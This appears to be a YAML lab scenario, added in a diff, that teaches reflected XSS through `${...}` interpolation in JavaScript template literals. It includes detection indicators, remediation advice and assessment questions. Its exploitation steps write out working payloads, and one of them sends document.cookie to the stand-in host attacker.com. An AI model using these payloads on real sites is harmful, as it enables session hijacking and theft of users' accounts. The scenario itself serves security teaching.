@@ -1,0 +1,92 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"
+id: "xss-reflected-template-literal-001"
+category: "xss"
+subcategory: "reflected"
+difficulty: "practitioner"
+estimated_time: "45 minutes"
+
+description: |
+  This scenario covers reflected XSS where input is placed inside a JavaScript
+  template literal (using backticks). Angle brackets, quotes, backslashes, and
+  backticks are Unicode-escaped. The attacker can bypass this by using the
+  `${...}` syntax within the template literal to execute JavaScript.
+
+learning_objectives:
+  - Understand JavaScript template literals and expression interpolation
+  - Bypass escaping of backticks and quotes using `${...}`
+  - Execute arbitrary JavaScript inside a template literal
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of JavaScript template literals
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify template literal context"
+    commands:
+      - "# Look for code like: `Hello ${userInput}`"
+      - "# Test if backticks and quotes are escaped"
+    expected_output: "Input is inside a template literal with characters escaped"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject `${...}` expression to execute code"
+    commands:
+      - "# Payload: ${alert('XSS')}"
+      - "# Since template literals evaluate expressions, this will execute"
+      - "# Test with a simple expression: ${7*7} to confirm evaluation"
+    expected_output: "JavaScript alert executes or expression evaluates"
+    detection: "Web server logs may show unusual parameters"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data via template literal"
+    commands:
+      - "# Payload: ${document.location='http://attacker.com/steal?cookie='+document.cookie}"
+    expected_output: "Cookie sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with ${} syntax in parameters"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Avoid putting user input in template literals"
+    - "Use proper JSON encoding for JavaScript contexts"
+  long_term:
+    - "Implement a Content Security Policy"
+    - "Use data attributes instead of inline JavaScript"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "What are JavaScript template literals and how do they differ from normal strings?"
+  - "How can `${}` syntax be used for XSS?"
+  - "Why is it dangerous to put user input in template literals?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals"
+    title: "MDN Template Literals"
